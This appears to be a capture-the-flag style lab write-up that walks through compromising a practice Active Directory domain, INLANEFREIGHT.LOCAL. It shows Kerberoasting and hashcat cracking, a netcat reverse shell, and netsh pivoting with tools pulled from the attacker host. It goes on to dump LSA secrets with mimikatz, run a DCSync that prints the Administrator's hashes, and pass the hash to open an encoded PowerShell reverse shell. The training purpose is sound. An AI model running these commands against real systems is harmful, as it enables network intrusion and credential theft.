# AD



## Nmap

```
80/tcp    open     http         syn-ack ttl 127
135/tcp   open     msrpc        syn-ack ttl 127
139/tcp   open     netbios-ssn  syn-ack ttl 127
445/tcp   open     microsoft-ds syn-ack ttl 127
5985/tcp  open     wsman        syn-ack ttl 127
47001/tcp open     winrm        syn-ack ttl 127

```

#### Kerberoasting for Windows

To operate the antak webshell, we need to read the [documentation](http://www.labofapenetrationtester.com/2014/06/introducing-antak.html).

Because every comand is executed in a different process, in order to use PowerView.ps1, we need to use them with semicolon.

First, we need to enumerate the SPNs

```
setspn.exe -Q */*
```

```
Checking domain DC=INLANEFREIGHT,DC=LOCAL
CN=DC01,OU=Domain Controllers,DC=INLANEFREIGHT,DC=LOCAL
	Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/DC01.INLANEFREIGHT.LOCAL
	ldap/DC01.INLANEFREIGHT.LOCAL/ForestDnsZones.INLANEFREIGHT.LOCAL
	ldap/DC01.INLANEFREIGHT.LOCAL/DomainDnsZones.INLANEFREIGHT.LOCAL
	DNS/DC01.INLANEFREIGHT.LOCAL
	GC/DC01.INLANEFREIGHT.LOCAL/INLANEFREIGHT.LOCAL
	RestrictedKrbHost/DC01.INLANEFREIGHT.LOCAL
	RestrictedKrbHost/DC01
	RPC/03d2eace-bb3d-467e-a00a-eab0dbfaa065._msdcs.INLANEFREIGHT.LOCAL
	HOST/DC01/INLANEFREIGHT
	HOST/DC01.INLANEFREIGHT.LOCAL/INLANEFREIGHT
	HOST/DC01
	HOST/DC01.INLANEFREIGHT.LOCAL
	HOST/DC01.INLANEFREIGHT.LOCAL/INLANEFREIGHT.LOCAL
	E3514235-4B06-11D1-AB04-00C04FC2DCD2/03d2eace-bb3d-467e-a00a-eab0dbfaa065/INLANEFREIGHT.LOCAL
	ldap/DC01/INLANEFREIGHT
	ldap/03d2eace-bb3d-467e-a00a-eab0dbfaa065._msdcs.INLANEFREIGHT.LOCAL
	ldap/DC01.INLANEFREIGHT.LOCAL/INLANEFREIGHT
	ldap/DC01
	ldap/DC01.INLANEFREIGHT.LOCAL
	ldap/DC01.INLANEFREIGHT.LOCAL/INLANEFREIGHT.LOCAL
CN=krbtgt,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
	kadmin/changepw
CN=svc_sql,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
	MSSQLSvc/SQL01.inlanefreight.local:1433
CN=sqlprod,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
	MSSQLSvc/SQL02.inlanefreight.local:1433
CN=sqldev,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
	MSSQLSvc/SQL-DEV01.inlanefreight.local:1433
CN=sqltest,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
	MSSQLSvc/DEVTEST.inlanefreight.local:1433
CN=sqlqa,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
	MSSQLSvc/QA001.inlanefreight.local:1433
CN=azureconnect,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
	adfsconnect/azure01.inlanefreight.local
CN=backupjob,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
	backupjob/veam001.inlanefreight.local
CN=WEB-WIN01,CN=Computers,DC=INLANEFREIGHT,DC=LOCAL
	RestrictedKrbHost/WEB-WIN01
	HOST/WEB-WIN01
	RestrictedKrbHost/WEB-WIN01.INLANEFREIGHT.LOCAL
	HOST/WEB-WIN01.INLANEFREIGHT.LOCAL
CN=MS01,CN=Computers,DC=INLANEFREIGHT,DC=LOCAL
	tapinego/MS01
	tapinego/MS01.INLANEFREIGHT.LOCAL
	TERMSRV/MS01
	TERMSRV/MS01.INLANEFREIGHT.LOCAL
	WSMAN/MS01
	WSMAN/MS01.INLANEFREIGHT.LOCAL
	RestrictedKrbHost/MS01
	HOST/MS01
	RestrictedKrbHost/MS01.INLANEFREIGHT.LOCAL
	HOST/MS01.INLANEFREIGHT.LOCAL

Existing SPN found!
```

After uploading the script with the antak option, we ca use it:

```
Import-Module C:\Windows\Temp\PowerView.ps1;Get-DomainUser * -spn | select samaccountname
```

And from the previus question, we have to use the user `svc_sql`.

Now we use PowerView to Target a Specific User.

```
Import-Module C:\Windows\Temp\PowerView.ps1;Get-DomainUser -Identity svc_sql | Get-DomainSPNTicket -Format Hashcat
```

And we obtain the kerberos' tiket:

```
$krb5tgs$23$*svc_sql$INLANEFREIGHT.LOCAL$MSSQLSvc/SQL01.inlanefreight.local:1433*$14AF6DAF300136315685173E15C336B1$D95CBB81A901FEFF205BC1376489340FE9E0AC661F6DD5F4E5BB3482DD92EEAC823ACD52803AEC6A83F2D4764497F5B515B4585B4AD1DEB32F10C208DB292456E596EFB82BD5579813AAFFEBDC7F7F23BDB791E01245334109A13B42942D4F198795A86EDECF103711E02A3C97064C213CE6A3089E542C291B6DF1850640E5290EEACDC733A55CE0CFEDD5853CA1280F2291DF753705458D784A0FD45338CFE2D6A0B9C023C9C66F7BB20B5C05FF6AC699F2384A6DA8F5F6AC9B969087AEFACC467F54E6E9D305BFF33E2232C91A99E3F96492809427D31374DF953E2880B0E13F8F9F4287F3F7A418555B707437DDCB210B0E6F8D0DD4CF81B3F45594878DABF81BA762ECDED10EDA047EB8D84A039FBCE4A61DD811F12C9B266A907F00BE814463A03BDFBFABF4C5D807D5E1BB4CB25C6B9583BD8BC5F018EA94675022288DA509178E631ADAB9A314DC4AF05E7CBE43DDDFA933FAD500CE5B03571485834F7A59FC8AC6F9066DC3B1F224DD482CA3297117B18BEE0BF54A038BB97693E5FA39AED30F2EFFFB3C2F56708DC2315DCD857D7480274FD1D550D395D0A6C29250048988E0B77E1B89EDAC8C26D9575ED90561BA01FA8A83EB00A88BB6DE25F6177D9827E03FE0CB89B43985D883999AFEC9E1001B7E0B1C9254A5A4ABC357FDAE550E16D0436D85290DD6F37B524FB1DF55582520CF2F3FC88EDD1EA2D5E5A0E51069A4E809FEF3A94E7EBCB7BFA93C2F16EFC44BB69308D8D67079BBB4747A87E836044A31A77CDDFBDB7A24E5E3D6CB0F843C362E3F1D3E4D58314DB9127C6EBACBBE01A350379E971C0A21B2B626C8FC8AF3E8FA691051AF5F45903A1C888A7EFF7A62D9D402E121ADC73C48CB12BF6BE3AC59A2FCE0F40501AD7FF35E03AD763EAFC70AC3A9E8DB11ADC2220C83D8734852B9C2792969445F95A72B6217A7EE60233AE6A7476E8E6807FB55890B605A3C8EFBAEC4AFFEE6BA4D50242A8C7C47C76E0067914D843663C794D96F113BFBB9211606D4C037B6248C12945E663430F07060707E963FAD1E753C37EABD9E0753D81583ACDADF9334251F28D26F847885E1DD63944DD9DB0B0992AF9011C0A5C3BA012597F597C21DE77A7DFA118096EF4EF96B186A047C973E9CF1825A4D16AB2C795A24D0BBDFB5A28494E994B8DF0B7CCEC2BD6980E9F343BAA0FCA730CF44C0DEBF3FEDFABE48A36A851993B1E74F55A242159692F4E0B9A8EB3379ABA0E2F86EF1619E6258948696340F11F7D3CF6AA1B133E2D49F5E336E67BAA1D177123BF262CA8B9B45F292DC4DA024BBF372149F4F1E72E2479DC1ED5F7C2893763226784A1F279D30B2F0893AEAA521B423145FE1FBADCB86E4E4474CE11148E9241E318D4FF25DFCCBCF39151EDDF2E4C2D2FA47950604AF866BED8BC3C1F9CBC90F3A8A14A68139897C01737699F867B9CEAD1D0E3D946CDF9C7ED0F9DAFD93B7D6ED8FF2DD932BF526AC41FD5D607CDE427C4695063B9E28A372B2EE76E0DFF8985EF59F933E
```

Crack the ticket hash with hashcat:

```
hashcat -m 13100 kerb1 /usr/share/wordlists/rockyou.txt
```

And the password is `lucky7`

In order to execute commands in another computer to type the flag on the desktop, we can modify the generic antak configuration to this:

```
$user = "svc_sql"
$pass = ConvertTo-SecureString -String "lucky7" -asplaintext -force
$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $user, $pass
Invoke-Command -ComputerName MS01.INLANEFREIGHT.LOCAL -Scriptblock {type C:\Users\Administrator\Desktop\flag.txt} -Credential $Credential
```

#### NEXT APROACH

To continue, we need another aproach. Instead of using the webshell, lets gain a better shell to pivot and use mimikatz in the second machine.

First we upload the [netcat 64 bits for windows](https://github.com/vinsworldcom/NetCat64/releases/download/1.11.6.4/nc64.exe) and create a reverse shell with our attack machine:

`nc -lnvp 8888` and `nc64.exe -e cmd.exe LIP LPORT` on the windows host.

And now we have to pivot using the box1.

For that, we use the `netsh.exe`command learned on the **port forwarding with Windows Netsh** module in **PIVOTING, TUNNELING, AND PORT FORWARDING.**&#x20;

#### To have a RDP connection from our attacking machinte to box2

We execute on box1:

```
netsh interface portproxy add v4tov4 listenport=1515 listenaddress=10.129.139.26 connectport=3389 connectaddress=172.16.6.50
```

Were the lister port and listener adress are from our attacking machine, and the oders from the box 1

#### To download files from our attacking machine in the box2

Using the same logic, we use:

```
netsh.exe interface portproxy add v4tov4 listenport=8001 listenaddress=172.16.6.100 connectport=8000 connectaddress=10.10.14.221
```

And now we transfer the needed tools throught powershell using `Invoke-WebRequest`

```
Invoke-WebRequest http://172.16.6.100:8001/mimikatz.exe -OutFile mimikatz.exe
```

#### To dump the lsa secrets using mimikatz

```
.\mimikatz.exe
token::elevate
lsadump::secrets
```

And the password for the user tpetty is Sup3rS3cur3D0m@inU2eR

### DCSync attack

#### in the second machine using the user with admin rights svc\_sql

Using the information provided in the **ACL Enumeration** module, we can determine that the `tpetty`username.

```
Import-Module .\PowerView.ps1

$tpettysid = Convert-NameToSid tpetty
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $tpettysid} -Verbose
```

And we detect that the **ObjectAce** Type are: **DS-Replication-Get-Changes-In-Filtered-Set** and **DS-Replication-Get-Changes**&#x20;

And now, in order to perform the attack with the user tpetty, we need to enable RDP to that user.

```
Add-LocalGroupMember -Group "Remote Desktop Users" -Member tpetty
```

And now, we replicate the netsh in the second machine also to allow download files from the third machine.

#### In the second machine, using the user tpetty&#x20;

We download mimikatz and execute:

```
lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator
```

```
mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator
[DC] 'INLANEFREIGHT.LOCAL' will be the domain
[DC] 'DC01.INLANEFREIGHT.LOCAL' will be the DC server
[DC] 'INLANEFREIGHT\administrator' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : Administrator

** SAM ACCOUNT **

SAM Username         : Administrator
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000200 ( NORMAL_ACCOUNT )
Account expiration   :
Password last change : 4/11/2022 9:24:49 PM
Object Security ID   : S-1-5-21-2270287766-1317258649-2146029398-500
Object Relative ID   : 500

Credentials:
  Hash NTLM: 27dedb1dab4d8545c6e1c66fba077da0
    ntlm- 0: 27dedb1dab4d8545c6e1c66fba077da0
    ntlm- 1: bdaffbfe64f1fc646a3353be1c2c3c99
    lm  - 0: 757743529af55e110994f3c7e3710fc9

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : b8bcb44123b3cc3bff20c663f1e0b94d

* Primary:Kerberos-Newer-Keys *
    Default Salt : INLANEFREIGHT.LOCALAdministrator
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : a76102a5617bffb1ea84ba0052767992823fd414697e81151f7de21bb41b1857
      aes128_hmac       (4096) : 69e27df2550c5c270eca1d8ce5c46230
      des_cbc_md5       (4096) : c2d9c892f2e6f2dc
    OldCredentials
      aes256_hmac       (4096) : 51d2b5ce03d6ea2e75e69050f32b927d0e602c2806dcb0d1dd0aacdda619a510
      aes128_hmac       (4096) : b93da9262f5ce0ed724ce0177366bc8a
      des_cbc_md5       (4096) : 0876d604a7087cf7
    OlderCredentials
      aes256_hmac       (4096) : 23cbc0dad348bebcbdbb4c82e9b23af299e8b56de358bafe24f2235f34497e4a
      aes128_hmac       (4096) : e35eb565af30c8ed79df5d8875508df6
      des_cbc_md5       (4096) : 4904021983252cd5

* Primary:Kerberos *
    Default Salt : INLANEFREIGHT.LOCALAdministrator
    Credentials
      des_cbc_md5       : c2d9c892f2e6f2dc
    OldCredentials
      des_cbc_md5       : 0876d604a7087cf7

* Packages *
    NTLM-Strong-NTOWF

* Primary:WDigest *
    01  c05d2bd2d448c260d63c391862358e9a
    02  2ba60ae4300b00bd1a20b601f24e386a
    03  cd2b7cce6ac8a39ac0a5a048feaa059a
    04  c05d2bd2d448c260d63c391862358e9a
    05  1084cdc6cf3b03a0425a0b4b6f8df2ab
    06  4cbd7e1c07a9cd8f5d74821b8f7d73b5
    07  a60dd8c295cfea5356e2e071336e4b73
    08  9549ac69526305a3b52fc7eb81c36d5b
    09  41883c94f1394d3f6420113ee9bde48b
    10  cf77d4474145a014474eac18cb559026
    11  9549ac69526305a3b52fc7eb81c36d5b
    12  81319b4284c63dd5ecab7c53c41f2f4b
    13  f586b7f78f320c2b7f7153e3adfa3d60
    14  7ddf4411eb64636a952e01a3a6065213
    15  581bab6ff054b23e65f14adc15126f9e
    16  8638e61dd907d6ca411e1be885cf6ae2
    17  fec8a8deb4f9320986e0deaae31c7974
    18  f7dc49e2e0539d0e221b46139677c903
    19  f405be39c0733cb794a2aca4b072f2a7
    20  cf83e03b8abad7ae24a3b010cf3c7577
    21  982dab323d8efa80ad1550985eb49e71
    22  731741e7f2f621aaa2f446eb77997beb
    23  b5928a821c656d267659d5eb5e4ab02d
    24  020ab18e15e8a5fbd66748455afae6e5
    25  4ac30d853103b2f8362243b72955d89f
    26  9a0a62820b990a595affa9ac2119f299
    27  5fda8e968eabd2561522cb2c2a918f56
    28  224906fbb8c4570c87416aaee7b6419c
    29  5632d3eb6e5fc24a09f67092988a92ef
```

#### And finally, in the second machine using the user svc\_sql

first we need to configure the environment for the pivoting

```
netsh.exe interface portproxy add v4tov4 listenport=9999 listenaddress=172.16.6.50 connectport=9999 connectaddress=172.16.6.100
netsh.exe interface portproxy add v4tov4 listenport=9999 listenaddress=172.16.6.100 connectport=9999 connectaddress=10.10.15.66
```

Now we download in the second machine MS01 the `Invoke-WMIExec.ps1` in order to execute a remote command.

This was taught on the **Pass the hash (PtH)** section in the **PASSWORD ATTACKS** module.

On our attacker machine:

```
nc -lnvp 9999
```

```
Import-Module .\Invoke-WMIExec.ps1
Invoke-WMIExec -Target DC01 -Domain inlanefreight.htb -Username administrator -Hash 27dedb1dab4d8545c6e1c66fba077da0 -Command "powershell -e JABjAGwAaQ...
```

And we execute the above on the MS01 machine to obtain a revershe shell.

The reverse shell code for powershell can be created on [https://www.revshells.com/](https://www.revshells.com/) using the Powershell#3 (base64)

